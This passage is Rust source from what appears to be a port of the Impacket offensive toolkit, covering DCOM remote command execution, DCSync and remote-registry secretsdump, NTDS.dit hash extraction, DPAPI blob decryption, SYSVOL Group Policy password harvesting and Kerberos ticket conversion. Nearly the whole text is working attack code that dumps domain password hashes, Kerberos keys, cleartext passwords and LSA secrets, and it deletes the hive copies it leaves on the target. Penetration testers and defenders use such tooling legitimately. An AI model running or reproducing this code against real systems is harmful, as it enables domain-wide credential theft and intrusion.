            } else if obj_str.contains("shellbrowser") {
                object = impacket_msrpc::DcomObject::ShellBrowserWindow;
            } else {
                object = impacket_msrpc::DcomObject::Mmc20;
            }
            i += 2;
        } else {
            i += 1;
        }
    }

    match impacket_msrpc::dcomexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &command,
        object,
        custom_share,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            print!("{}", output);
            if !output.ends_with('\n') {
                println!();
            }
        }
        Err(e) => {
            eprintln!("[-] dcomexec error: {}", e);
            std::process::exit(1);
        }
    }
}

fn rand_hex() -> String {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0xC0FFEE);
    format!("{:08x}", (n as u64) ^ (n >> 64) as u64)
}

/// Remote secretsdump: Active Directory DCSync via MS-DRSR or SAM+SYSTEM+SECURITY hives via MS-RRP.
fn cmd_secretsdump(args: &[String]) {
    use impacket_core::CoreError;
    use impacket_msrpc::drsr::{self, ds_name_format, kerb_etype};
    use impacket_msrpc::rrp::{RrpClient, MAXIMUM_ALLOWED};

    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let host = spec.effective_target_ip();

    // Parse DCSync and hive extraction command-line flags
    let mut just_dc = false;
    let mut just_dc_user: Option<String> = None;
    let mut just_dc_ntlm = false;
    let mut dump_security = false;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-just-dc" | "--just-dc" => just_dc = true,
            "-just-dc-ntlm" | "--just-dc-ntlm" => {
                just_dc = true;
                just_dc_ntlm = true;
            }
            "-just-dc-user" | "--just-dc-user" => {
                just_dc = true;
                if i + 1 < args.len() {
                    just_dc_user = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-security" | "--security" => dump_security = true,
            _ => {}
        }
        i += 1;
    }

    // -------------------------------------------------------------------------
    // Mode A: Active Directory DCSync (MS-DRSR / DRSUAPI)
    // -------------------------------------------------------------------------
    if just_dc {
        println!("[*] Connecting to Active Directory DRSUAPI on {}", host);
        let run_drs = (|| -> Result<(), CoreError> {
            let transport = match SmbPipeTransport::connect(
                host,
                &spec.domain,
                &spec.username,
                &cred,
                "lsass",
                drsr::DRSUAPI_INTERFACE_UUID,
                drsr::DRSUAPI_VERSION_MAJOR,
                drsr::DRSUAPI_VERSION_MINOR,
                spec.compat_profile,
                DEFAULT_TIMEOUT,
            ) {
                Ok(t) => t,
                Err(_) => SmbPipeTransport::connect(
                    host,
                    &spec.domain,
                    &spec.username,
                    &cred,
                    "drsuapi",
                    drsr::DRSUAPI_INTERFACE_UUID,
                    drsr::DRSUAPI_VERSION_MAJOR,
                    drsr::DRSUAPI_VERSION_MINOR,
                    spec.compat_profile,
                    DEFAULT_TIMEOUT,
                )?,
            };

            let session_key = transport.session_key().to_vec();
            let mut drs = impacket_msrpc::DrsClient::new(transport, &session_key);
            println!("[*] Binding to DRSUAPI and negotiating RPC extensions...");
            let _handle = drs.bind()?;

            if let Some(user_name) = just_dc_user {
                println!("[*] Resolving user '{}' via DRSCrackNames...", user_name);
                let cracked = drs
                    .crack_name(
                        &user_name,
                        ds_name_format::DS_NT4_ACCOUNT_NAME_SANS_DOMAIN,
                        ds_name_format::DS_UNIQUE_ID_NAME,
                    )
                    .unwrap_or_else(|_| user_name.clone());

                let mut guid = [0u8; 16];
                if let Ok(u) = impacket_ndr::RpcUuid::parse(cracked.trim_matches('{').trim_matches('}')) {
                    guid = u.to_le_bytes();
                }

                println!("[*] Replicating credentials via DRSGetNCChanges...");
                let account = drs.sync_user_guid(&guid)?;
                println!();
                println!("[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)");
                println!("{}", account.to_secretsdump_line());

                if !just_dc_ntlm {
                    if !account.kerberos_keys.is_empty() {
                        println!();
                        println!("[*] Kerberos keys grabbed:");
                        for (etype, k) in &account.kerberos_keys {
                            let mut hex_k = String::with_capacity(k.len() * 2);
                            for b in k {
                                hex_k.push_str(&format!("{:02x}", b));
                            }
                            println!("{}:{}:{}", account.account_name, kerb_etype::etype_name(*etype), hex_k);
                        }
                    }
                    if let Some(ref clear) = account.cleartext_password {
                        println!();
                        println!("[*] ClearText password grabbed:");
                        println!("{}:CLEARTEXT:{}", account.account_name, clear);
                    }
                }
            } else {
                println!("[*] Enumerating domain accounts via MS-SAMR for full DCSync...");
                let samr_iface = &WELL_KNOWN_INTERFACES[IFACE_SAMR];
                let samr_transport = SmbPipeTransport::connect(
                    host,
                    &spec.domain,
                    &spec.username,
                    &cred,
                    "samr",
                    samr_iface.uuid,
                    samr_iface.version_major,
                    samr_iface.version_minor,
                    spec.compat_profile,
                    DEFAULT_TIMEOUT,
                )?;
                let mut samr = impacket_msrpc::SamrClient::new(samr_transport);
                let server_name = format!(r"\\{}", host);
                let server = samr.connect5(&server_name, 0x0000_0230)?;
                let domains = samr.enumerate_domains(&server)?;
                for d in &domains {
                    if d.name.eq_ignore_ascii_case("Builtin") {
                        continue;
                    }
                    let sid = samr.lookup_domain(&server, &d.name)?;
                    let dom = samr.open_domain(&server, 0x0000_0300, &sid)?;
                    let users = samr.enumerate_users(&dom, 0)?;
                    println!("[*] Replicating {} domain accounts in '{}'...", users.len(), d.name);
                    for u in &users {
                        let mut guid = [0u8; 16];
                        guid[0..4].copy_from_slice(&u.relative_id.to_le_bytes());
                        if let Ok(acc) = drs.sync_user_guid(&guid) {
                            println!("{}", acc.to_secretsdump_line());
                            if !just_dc_ntlm {
                                for (etype, k) in &acc.kerberos_keys {
                                    let mut hex_k = String::with_capacity(k.len() * 2);
                                    for b in k {
                                        hex_k.push_str(&format!("{:02x}", b));
                                    }
                                    println!("{}:{}:{}", acc.account_name, kerb_etype::etype_name(*etype), hex_k);
                                }
                                if let Some(ref clear) = acc.cleartext_password {
                                    println!("{}:CLEARTEXT:{}", acc.account_name, clear);
                                }
                            }
                        }
                    }
                }
            }

            let _ = drs.unbind();
            Ok(())
        })();

        if let Err(e) = run_drs {
            eprintln!("[-] DCSync error: {}", e);
            std::process::exit(1);
        }
        return;
    }

    // -------------------------------------------------------------------------
    // Mode B: Remote Registry (MS-RRP) Hive Extraction
    // -------------------------------------------------------------------------
    let token = rand_hex();
    let hives_to_dump = if dump_security {
        vec!["SYSTEM", "SAM", "SECURITY"]
    } else {
        vec!["SYSTEM", "SAM"]
    };

    let result = (|| -> Result<Vec<u8>, CoreError> {
        let rrp_iface = &WELL_KNOWN_INTERFACES[IFACE_RRP];
        let transport = SmbPipeTransport::connect(
            host, &spec.domain, &spec.username, &cred, "winreg",
            rrp_iface.uuid, rrp_iface.version_major, rrp_iface.version_minor,
            spec.compat_profile, DEFAULT_TIMEOUT,
        )?;
        let mut rrp = RrpClient::new(transport);
        let hklm = rrp.open_local_machine(MAXIMUM_ALLOWED)?;
        for hive in &hives_to_dump {
            let key = rrp.open_key(&hklm, hive, MAXIMUM_ALLOWED)?;
            rrp.save_key(&key, &format!(r"..\Temp\{}_{}.save", hive, token))?;
            let _ = rrp.close_key(&key);
        }
        let _ = rrp.close_key(&hklm);
        Ok(hklm.to_vec())
    })();
    if let Err(e) = result {
        eprintln!("[-] secretsdump (RRP save) error: {}", e);
        std::process::exit(1);
    }

    // Download saved hives from C$\Windows\Temp and clean up
    let download = (|| -> Result<(Vec<u8>, Vec<u8>, Option<Vec<u8>>), CoreError> {
        let mut conn = impacket_smb::SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT)?;
        conn.login(&spec.domain, &spec.username, &cred, "impacket-rs")?;
        conn.tree_connect_share(host, "C$")?;
        let system = conn.read_full_file(&format!(r"Windows\Temp\SYSTEM_{}.save", token))?;
        let sam = conn.read_full_file(&format!(r"Windows\Temp\SAM_{}.save", token))?;
        let _ = conn.delete_file(&format!(r"Windows\Temp\SYSTEM_{}.save", token));
        let _ = conn.delete_file(&format!(r"Windows\Temp\SAM_{}.save", token));
        let security = if dump_security {
            let sec = conn.read_full_file(&format!(r"Windows\Temp\SECURITY_{}.save", token))?;
            let _ = conn.delete_file(&format!(r"Windows\Temp\SECURITY_{}.save", token));
            Some(sec)
        } else {
            None
        };
        Ok((sam, system, security))
    })();

    let (sam, system, security) = match download {
        Ok(trio) => trio,
        Err(e) => {
            eprintln!("[-] secretsdump (download) error: {}", e);
            std::process::exit(1);
        }
    };

    match impacket_sam::secretsdump_local(&sam, &system) {
        Ok(accounts) => {
            println!("[*] Dumping SAM hashes (uid:rid:lmhash:nthash)");
            for a in &accounts {
                println!("{}", a.to_secretsdump_line());
            }
            println!("[*] {} accounts.", accounts.len());
        }
        Err(e) => {
            eprintln!("[-] secretsdump (parse) error: {}", e);
            std::process::exit(1);
        }
    }

    if let Some(sec_bytes) = security {
        let bootkey = match impacket_sam::bootkey_from_system_hive(&system) {
            Ok(k) => k,
            Err(e) => {
                eprintln!("[-] cannot extract BootKey from SYSTEM hive: {}", e);
                return;
            }
        };

        let lsa_parser = match impacket_sam::LsaParser::new(&sec_bytes, bootkey) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("[-] failed to initialize LSA parser: {}", e);
                return;
            }
        };

        println!();
        println!("[*] Dumping cached domain logon information (domain/username:hash)");
        if let Ok(cached_list) = lsa_parser.dump_cached_hashes() {
            for c in &cached_list {
                println!("{}", c.format_hashcat());
            }
            println!("[*] {} cached credentials.", cached_list.len());
        }

        println!();
        println!("[*] Dumping LSA Secrets");
        if let Ok(secrets) = lsa_parser.dump_secrets() {
            for s in &secrets {
                println!("[*] {}", s.name);
                if let Some(ref txt) = s.secret_text {
                    println!("    {}", txt);
                }
            }
            println!("[*] {} LSA secrets.", secrets.len());
        }
    }
}

fn cmd_secretsdump_local(args: &[String]) {
    print!("{}", version::BANNER);
    if args.len() < 2 {
        eprintln!("[-] usage: secretsdump-local <SAM_HIVE_FILE> <SYSTEM_HIVE_FILE> [SECURITY_HIVE_FILE]");
        std::process::exit(1);
    }
    let sam = match std::fs::read(&args[0]) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] cannot read SAM hive '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };
    let system = match std::fs::read(&args[1]) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] cannot read SYSTEM hive '{}': {}", args[1], e);
            std::process::exit(1);
        }
    };
    match impacket_sam::secretsdump_local(&sam, &system) {
        Ok(accounts) => {
            println!("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
            for a in &accounts {
                println!("{}", a.to_secretsdump_line());
            }
            println!("[*] {} accounts.", accounts.len());
        }
        Err(e) => {
            eprintln!("[-] secretsdump-local error: {}", e);
            std::process::exit(1);
        }
    }

    if args.len() >= 3 {
        let sec_path = &args[2];
        let security = match std::fs::read(sec_path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] cannot read SECURITY hive '{}': {}", sec_path, e);
                return;
            }
        };

        let bootkey = match impacket_sam::bootkey_from_system_hive(&system) {
            Ok(k) => k,
            Err(e) => {
                eprintln!("[-] cannot extract BootKey from SYSTEM hive: {}", e);
                return;
            }
        };

        let lsa_parser = match impacket_sam::LsaParser::new(&security, bootkey) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("[-] failed to initialize LSA parser: {}", e);
                return;
            }
        };

        println!();
        println!("[*] Dumping cached domain logon information (domain/username:hash)");
        match lsa_parser.dump_cached_hashes() {
            Ok(cached_list) => {
                for c in &cached_list {
                    println!("{}", c.format_hashcat());
                }
                println!("[*] {} cached credentials.", cached_list.len());
            }
            Err(e) => {
                eprintln!("[-] error dumping cached hashes: {}", e);
            }
        }

        println!();
        println!("[*] Dumping LSA Secrets");
        match lsa_parser.dump_secrets() {
            Ok(secrets) => {
                for s in &secrets {
                    println!("[*] {}", s.name);
                    if let Some(ref txt) = s.secret_text {
                        println!("    {}", txt);
                    } else {
                        println!("    (hex): {}", encode_hex(&s.secret_raw));
                    }
                }
                println!("[*] {} LSA secrets.", secrets.len());
            }
            Err(e) => {
                eprintln!("[-] error dumping LSA secrets: {}", e);
            }
        }
    }
}

fn cmd_esentutl(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("[-] usage: esentutl <DATABASE_FILE> [tables | table <NAME>]");
        std::process::exit(1);
    }
    let file = match std::fs::File::open(&args[0]) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[-] cannot open database '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };
    let mut db = match impacket_sam::EseDatabase::open(file) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("[-] failed to parse ESE database: {}", e);
            std::process::exit(1);
        }
    };

    println!("[*] ESE Database: {}", args[0]);
    println!("  Version   : 0x{:04x}", db.header().version);
    println!("  Revision  : 0x{:04x}", db.header().file_format_revision);
    println!("  Page Size : {} bytes", db.header().page_size);
    println!("  DB State  : {}", match db.header().db_state {
        1 => "JustCreated",
        2 => "DirtyShutdown",
        3 => "CleanShutdown",
        4 => "BeingConverted",
        _ => "Unknown",
    });
    println!();

    let subcmd = args.get(1).map(|s| s.as_str()).unwrap_or("tables");
    match subcmd {
        "table" => {
            let tname = match args.get(2) {
                Some(n) => n.as_str(),
                None => {
                    eprintln!("[-] table command requires <TABLE_NAME>");
                    std::process::exit(1);
                }
            };
            match db.read_table_records(tname) {
                Ok(records) => {
                    println!("[+] Table '{}' contains {} records:\n", tname, records.len());
                    for (i, rec) in records.iter().take(20).enumerate() {
                        println!("--- Record #{} ---", i + 1);
                        for (k, v) in rec {
                            match v {
                                impacket_sam::EseValue::Nil => {}
                                impacket_sam::EseValue::Text(s) => println!("  {}: {}", k, s),
                                impacket_sam::EseValue::ULong(u) => println!("  {}: {}", k, u),
                                impacket_sam::EseValue::Long(l) => println!("  {}: {}", k, l),
                                impacket_sam::EseValue::DateTime(dt) => println!("  {}: 0x{:016x}", k, dt),
                                impacket_sam::EseValue::Binary(b) => {
                                    if b.len() <= 32 {
                                        println!("  {}: {}", k, encode_hex(b));
                                    } else {
                                        println!("  {}: <binary {} bytes>", k, b.len());
                                    }
                                }
                                other => println!("  {}: {:?}", k, other),
                            }
                        }
                    }
                    if records.len() > 20 {
                        println!("... (truncated {} records)", records.len() - 20);
                    }
                }
                Err(e) => {
                    eprintln!("[-] failed to read table records: {}", e);
                    std::process::exit(1);
                }
            }
        }
        _ => {
            println!("[+] Catalog contains {} tables:\n", db.tables().len());
            println!("{:<30} {:<10} {:<15}", "Table Name", "Columns", "Father Page");
            println!("{:-<30} {:-<10} {:-<15}", "", "", "");
            for (tname, tdef) in db.tables() {
                println!("{:<30} {:<10} {:<15}", tname, tdef.columns.len(), tdef.father_data_page_number);
            }
        }
    }
}

fn cmd_ntdsdump(args: &[String]) {
    print!("{}", version::BANNER);
    if args.len() < 2 {
        eprintln!("[-] usage: ntdsdump <SYSTEM_HIVE_FILE> <NTDS_DIT_FILE>");
        std::process::exit(1);
    }
    let system_bytes = match std::fs::read(&args[0]) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] cannot read SYSTEM hive '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };
    let boot_key = match impacket_sam::bootkey_from_system_hive(&system_bytes) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[-] failed to recover bootKey from SYSTEM hive: {}", e);
            std::process::exit(1);
        }
    };
    println!("[*] Recovered domain bootKey: {}", encode_hex(&boot_key));

    let file = match std::fs::File::open(&args[1]) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[-] cannot open NTDS.dit '{}': {}", args[1], e);
            std::process::exit(1);
        }
    };

    println!("[*] Parsing NTDS.dit and recovering Password Encryption Keys (PEK)...");
    let mut ntds = match impacket_sam::NtdsParser::new(file, boot_key) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[-] failed to initialize NTDS parser: {}", e);
            std::process::exit(1);
        }
    };
    println!("[+] Decrypted {} PEK key(s)", ntds.pek_list().len());
    for (i, pek) in ntds.pek_list().iter().enumerate() {
        println!("    PEK #{}: {}", i, encode_hex(pek));
    }

    println!();
    println!("[*] Dumping Active Directory domain hashes (sAMAccountName:RID:LM:NT)");
    match ntds.dump_accounts() {
        Ok(accounts) => {
            let empty_lm = "aad3b435b51404eeaad3b435b51404ee";
            let empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0";
            for a in &accounts {
                let lm = a.lm_hash.as_ref().map(|h| encode_hex(h)).unwrap_or_else(|| empty_lm.to_string());
                let nt = a.nt_hash.as_ref().map(|h| encode_hex(h)).unwrap_or_else(|| empty_nt.to_string());
                println!("{}:{}:{}:{}::: (UAC: 0x{:08x})", a.sam_account_name, a.rid, lm, nt, a.user_account_control);
            }
            println!("[*] {} domain accounts dumped.", accounts.len());
        }
        Err(e) => {
            eprintln!("[-] failed to dump accounts: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_dpapi(args: &[String]) {
    use impacket_core::decode_hex;
    print!("{}", version::BANNER);
    if args.len() < 2 {
        eprintln!("[-] usage: dpapi <masterkey|blob> <FILE> [-key <HEX_KEY>]");
        std::process::exit(1);
    }
    let mode = args[0].to_lowercase();
    let file_bytes = match std::fs::read(&args[1]) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] cannot read file '{}': {}", args[1], e);
            std::process::exit(1);
        }
    };

    let mut hex_key = None;
    let mut i = 2;
    while i < args.len() {
        if args[i] == "-key" && i + 1 < args.len() {
            hex_key = Some(args[i + 1].clone());
            i += 2;
        } else {
            i += 1;
        }
    }

    match mode.as_str() {
        "masterkey" => {
            let mk = if let Ok(mkf) = impacket_sam::MasterKeyFile::parse(&file_bytes) {
                println!("[*] Parsed MasterKeyFile (GUID: {})", mkf.guid);
                println!("  Version       : {}", mkf.version);
                println!("  Flags         : 0x{:08x}", mkf.flags);
                println!("  Policy        : 0x{:08x}", mkf.policy);
                println!("  MasterKeyLen  : {} bytes", mkf.master_key_bytes.len());
                println!("  BackupKeyLen  : {} bytes", mkf.backup_key_bytes.len());
                println!("  CredHistLen   : {} bytes", mkf.cred_hist_bytes.len());
                impacket_sam::MasterKey::parse(&mkf.master_key_bytes)
            } else {
                impacket_sam::MasterKey::parse(&file_bytes)
            };

            match mk {
                Ok(key_obj) => {
                    println!("[+] MasterKey Details:");
                    println!("  Version   : {}", key_obj.version);
                    println!("  Rounds    : {}", key_obj.rounds);
                    println!("  Hash Algo : 0x{:08x}", key_obj.hash_algo);
                    println!("  Crypt Algo: 0x{:08x}", key_obj.crypt_algo);
                    println!("  Salt      : {}", encode_hex(&key_obj.salt));
                    println!("  Data Len  : {} bytes", key_obj.data.len());

                    if let Some(ref khex) = hex_key {
                        let clean_hex = khex.trim_start_matches("0x").trim();
                        if let Ok(kbytes) = decode_hex(clean_hex) {
                            match key_obj.decrypt(&kbytes) {
                                Ok(decrypted) => {
                                    println!("[+] Decrypted 64-byte MasterKey: {}", encode_hex(&decrypted));
                                }
                                Err(e) => {
                                    eprintln!("[-] Decryption failed: {}", e);
                                }
                            }
                        } else {
                            eprintln!("[-] Invalid hex key string");
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Failed to parse MasterKey: {}", e);
                }
            }
        }
        "blob" => {
            match impacket_sam::DpapiBlob::parse(&file_bytes) {
                Ok(blob) => {
                    println!("[+] DPAPI Blob Details:");
                    println!("  Version          : {}", blob.version);
                    println!("  Description      : {}", blob.description);
                    println!("  MasterKey Version: {}", blob.master_key_version);
                    println!("  MasterKey GUID   : {}", encode_hex(&blob.guid_master_key));
                    println!("  Flags            : 0x{:08x}", blob.flags);
                    println!("  Crypt Algo       : 0x{:08x}", blob.crypt_algo);
                    println!("  Hash Algo        : 0x{:08x}", blob.hash_algo);
                    println!("  Salt             : {}", encode_hex(&blob.salt));
                    println!("  Ciphertext Len   : {} bytes", blob.data.len());

                    if let Some(ref khex) = hex_key {
                        let clean_hex = khex.trim_start_matches("0x").trim();
                        if let Ok(kbytes) = decode_hex(clean_hex) {
                            match blob.decrypt(&kbytes, None) {
                                Ok(cleartext) => {
                                    if let Ok(s) = std::str::from_utf8(&cleartext) {
                                        println!("[+] Decrypted Plaintext: {}", s);
                                    } else {
                                        println!("[+] Decrypted Plaintext (hex): {}", encode_hex(&cleartext));
                                    }
                                }
                                Err(e) => {
                                    eprintln!("[-] Blob decryption failed: {}", e);
                                }
                            }
                        } else {
                            eprintln!("[-] Invalid hex key string");
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Failed to parse DPAPI Blob: {}", e);
                }
            }
        }
        _ => {
            eprintln!("[-] unknown mode '{}', expected 'masterkey' or 'blob'", mode);
            std::process::exit(1);
        }
    }
}

fn cmd_gpp_password(args: &[String]) {
    print!("{}", version::BANNER);

    let mut xml_file: Option<String> = None;
    let mut share_name = "SYSVOL".to_string();

    let mut i = 0;
    while i < args.len() {
        if (args[i] == "-xmlfile" || args[i] == "--xmlfile" || args[i] == "-file") && i + 1 < args.len() {
            xml_file = Some(args[i + 1].clone());
            i += 2;
            continue;
        }
        if (args[i] == "-share" || args[i] == "--share") && i + 1 < args.len() {
            share_name = args[i + 1].clone();
            i += 2;
            continue;
        }
        i += 1;
    }

    // 1. Offline Mode: Local GPP XML file.
    if let Some(file_path) = xml_file {
        println!("[*] Offline GPP analysis: reading {}", file_path);
        let raw_bytes = match std::fs::read(&file_path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Error opening {}: {}", file_path, e);
                std::process::exit(1);
            }
        };
        let xml_str = if raw_bytes.starts_with(&[0xff, 0xfe]) {
            impacket_core::decode_utf16le(&raw_bytes[2..])
                .unwrap_or_else(|_| String::from_utf8_lossy(&raw_bytes).into_owned())
        } else if raw_bytes.starts_with(&[0xef, 0xbb, 0xbf]) {
            String::from_utf8_lossy(&raw_bytes[3..]).into_owned()
        } else {
            String::from_utf8_lossy(&raw_bytes).into_owned()
        };

        match impacket_sam::parse_gpp_xml(&xml_str, &file_path) {
            Ok(creds) => {
                if creds.is_empty() {
                    println!("[*] No Group Policy Preferences credentials found in {}", file_path);
                } else {
                    println!("[+] Recovered {} GPP credential(s) from {}:", creds.len(), file_path);
                    for c in creds {
                        println!("  [+] User       : {}", c.user_name);
                        if let Some(ref n) = c.new_name {
                            println!("      New Name   : {}", n);
                        }
                        println!("      Password   : {}", c.password);
                        if let Some(ref ch) = c.changed {
                            println!("      Changed    : {}", ch);
                        }
                        if let Some(ref desc) = c.description {
                            println!("      Description: {}", desc);
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("[-] XML parse error: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    // 2. Online Mode: SYSVOL SMB scan
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(_) => {
            eprintln!("[-] usage: Get-GPPPassword <TARGET> [-xmlfile <PATH>] [-share <SYSVOL>] [-hashes LM:NT]");
            eprintln!("    Extracts and decrypts AES-256 cpassword attributes in Active Directory SYSVOL or local XML.");
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let host = spec.effective_target_ip();

    let mut conn = match impacket_smb::SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] SMB connect error: {}", e);
            std::process::exit(1);
        }
    };

    if let Err(e) = conn.login(&spec.domain, &spec.username, &cred, "impacket-rs") {
        eprintln!("[-] SMB authentication error: {}", e);
        std::process::exit(1);
    }

    println!("[+] Authenticated as {}\\{}", spec.domain, spec.username);
    println!("[*] Connecting to share \\\\{}\\{} ...", host, share_name);

    if let Err(e) = conn.tree_connect_share(host, &share_name) {
        eprintln!("[-] Failed to connect to share {}: {}", share_name, e);
        std::process::exit(1);
    }

    let gpp_relative_paths = [
        "MACHINE\\Preferences\\Groups\\Groups.xml",
        "USER\\Preferences\\Groups\\Groups.xml",
        "MACHINE\\Preferences\\Services\\Services.xml",
        "USER\\Preferences\\Services\\Services.xml",
        "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
        "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
        "MACHINE\\Preferences\\Datasources\\Datasources.xml",
        "USER\\Preferences\\Datasources\\Datasources.xml",
        "MACHINE\\Preferences\\Printers\\Printers.xml",
        "USER\\Preferences\\Printers\\Printers.xml",
        "MACHINE\\Preferences\\Drives\\Drives.xml",
        "USER\\Preferences\\Drives\\Drives.xml",
    ];

    println!("[*] Enumerating Group Policy Objects in SYSVOL...");
    let mut policy_roots = Vec::new();

    if let Ok(root_entries) = conn.list_directory("") {
        for entry in root_entries {
            if entry.is_directory {
                if entry.name.eq_ignore_ascii_case("Policies") {
                    policy_roots.push("Policies".to_string());
                } else if !entry.name.starts_with('.') {
                    let sub_pol = format!("{}\\Policies", entry.name);
                    if let Ok(sub_entries) = conn.list_directory(&sub_pol) {
                        if !sub_entries.is_empty() {
                            policy_roots.push(sub_pol);
                        }
                    }
                }
            }
        }
    }

    if policy_roots.is_empty() {
        if !spec.domain.is_empty() {
            policy_roots.push(format!("{}\\Policies", spec.domain));
        } else {
            policy_roots.push("Policies".to_string());
        }
    }

    let mut total_creds = 0;

    for pol_root in &policy_roots {
        println!("[*] Scanning directory: {}", pol_root);
        let gpo_dirs = match conn.list_directory(pol_root) {
            Ok(entries) => entries,
            Err(_) => continue,
        };

        for gpo in gpo_dirs {
            if !gpo.is_directory || gpo.name.starts_with('.') {
                continue;
            }
            let gpo_path = format!("{}\\{}", pol_root, gpo.name);

            for rel_xml in &gpp_relative_paths {
                let full_xml_path = format!("{}\\{}", gpo_path, rel_xml);
                if let Ok(xml_bytes) = conn.read_full_file(&full_xml_path) {
                    let xml_str = if xml_bytes.starts_with(&[0xff, 0xfe]) {
                        impacket_core::decode_utf16le(&xml_bytes[2..])
                            .unwrap_or_else(|_| String::from_utf8_lossy(&xml_bytes).into_owned())
                    } else if xml_bytes.starts_with(&[0xef, 0xbb, 0xbf]) {
                        String::from_utf8_lossy(&xml_bytes[3..]).into_owned()
                    } else {
                        String::from_utf8_lossy(&xml_bytes).into_owned()
                    };

                    if let Ok(creds) = impacket_sam::parse_gpp_xml(&xml_str, &full_xml_path) {
                        for c in creds {
                            total_creds += 1;
                            println!("[+] Found GPP credential in: {}", c.file_path);
                            println!("    User       : {}", c.user_name);
                            if let Some(ref n) = c.new_name {
                                println!("    New Name   : {}", n);
                            }
                            println!("    Password   : {}", c.password);
                            if let Some(ref ch) = c.changed {
                                println!("    Changed    : {}", ch);
                            }
                            if let Some(ref desc) = c.description {
                                println!("    Description: {}", desc);
                            }
                        }
                    }
                }
            }
        }
    }

    if total_creds == 0 {
        println!("[*] SYSVOL scan complete. No Group Policy Preferences passwords found.");
    } else {
        println!("[+] SYSVOL scan complete. Total passwords found: {}", total_creds);
    }
}

fn cmd_ticket_converter(args: &[String]) {
    use impacket_core::decode_base64;
    use impacket_krb5::ccache::CCache;

    print!("{}", version::BANNER);
    let is_base64 = args.iter().any(|a| a == "-b" || a == "--base64");
    let pos_args: Vec<&str> = args
        .iter()
        .map(|s| s.as_str())
        .filter(|&a| a != "-b" && a != "--base64")
        .collect();

    if pos_args.len() < 2 {
        eprintln!("[-] usage: ticketConverter <INPUT_FILE> <OUTPUT_FILE> [-b|--base64]");
        eprintln!("    Converts between Windows Mimikatz (.kirbi) and MIT Kerberos (.ccache)");
        std::process::exit(1);
    }

    let input_path = pos_args[0];
    let output_path = pos_args[1];

    let raw_bytes = if is_base64 {
        let text = match std::fs::read_to_string(input_path) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[-] cannot read input file '{}': {}", input_path, e);
                std::process::exit(1);
            }
        };
        match decode_base64(&text) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] base64 decode error: {}", e);
                std::process::exit(1);
            }
        }
    } else {
        match std::fs::read(input_path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] cannot read input file '{}': {}", input_path, e);
                std::process::exit(1);
            }
        }
    };

    if raw_bytes.is_empty() {
        eprintln!("[-] input file is empty");
        std::process::exit(1);
    }

    match raw_bytes[0] {
        0x76 => {
            println!("[*] Detected input format: Windows Mimikatz .kirbi (KRB-CRED)");
            match CCache::from_kirbi(&raw_bytes) {
                Ok(ccache) => {
                    let out_data = ccache.to_bytes();
                    if let Err(e) = std::fs::write(output_path, &out_data) {
                        eprintln!("[-] cannot write output file '{}': {}", output_path, e);
                        std::process::exit(1);
                    }
                    println!(
                        "[+] Converted to MIT .ccache v4 ({} credentials, written to '{}')",
                        ccache.credentials.len(),
                        output_path
                    );
                }
                Err(e) => {
                    eprintln!("[-] kirbi parse error: {}", e);
                    std::process::exit(1);
                }
            }
        }
        0x05 => {
            println!("[*] Detected input format: MIT Kerberos .ccache");
            match CCache::parse(&raw_bytes) {
                Ok(ccache) => match ccache.to_kirbi() {
                    Ok(kirbi_data) => {
                        if let Err(e) = std::fs::write(output_path, &kirbi_data) {
                            eprintln!("[-] cannot write output file '{}': {}", output_path, e);
                            std::process::exit(1);
                        }
                        println!(
                            "[+] Converted to Windows Mimikatz .kirbi ({} credentials, written to '{}')",
                            ccache.credentials.len(),
                            output_path
                        );
                    }
                    Err(e) => {
                        eprintln!("[-] kirbi encode error: {}", e);
                        std::process::exit(1);
                    }
                },
                Err(e) => {
                    eprintln!("[-] ccache parse error: {}", e);
                    std::process::exit(1);
                }
            }
        }
        other => {
            eprintln!(
